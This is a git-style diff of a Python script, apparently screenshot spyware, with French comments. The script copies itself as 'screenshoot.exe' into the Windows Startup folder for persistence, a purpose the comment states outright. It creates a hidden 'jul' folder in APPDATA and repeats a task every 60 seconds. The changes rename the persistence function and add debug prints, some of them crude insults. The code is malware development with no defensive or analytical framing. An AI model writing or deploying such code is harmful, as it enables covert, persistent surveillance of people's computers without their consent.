@@ -16,8 +16,13 @@ appdata = os.getenv('APPDATA')
 startup = winshell.startup()
 
 script_location = os.path.split(os.path.realpath(sys.argv[0]))[0]
+print(script_location)
+
 USER_NAME = getpass.getuser()
-filename = os.path.splitext(os.path.basename(__file__))[0]
+
+filename = "screenshoot.exe"
+
+print(rf"{script_location}\%s" % filename)
 
 #créer un dossier jul dans le appdata de la machine
 dirName = f'{appdata}/jul'
@@ -25,6 +30,11 @@ try:
     os.makedirs(dirName)
 except FileExistsError:
     print("pd")
+
+if Path(f'{startup}\screenshoot.exe').is_file():
+    print("fdp")
+else:
+    print('momosexuel')
 
 def jul():
     while True:
@@ -51,15 +61,14 @@ def jul():
         #attendre 60 secondes avant de répeter la tache ducoup
         time.sleep(60)
 
-#ajout du programme dans le dossier startup de windows (persistence)
-def startup(file_path=rf"{script_location}\%s" % filename):
+def add_to_startup(file_path=rf"{script_location}\%s" % filename):
     startuppath = f'{startup}'
-    if Path(f'{startup}\%s' % filename).is_file():
+    if Path(f'{startup}\screenshoot.exe').is_file():
         jul()
         return
     else:
         shutil.move(file_path, startuppath)
         time.sleep(30)
-        os.startfile(f"{startuppath}\%s.exe" % filename)
+        os.startfile(f"{startuppath}\screenshoot.exe")
 
-startup()
+add_to_startup()
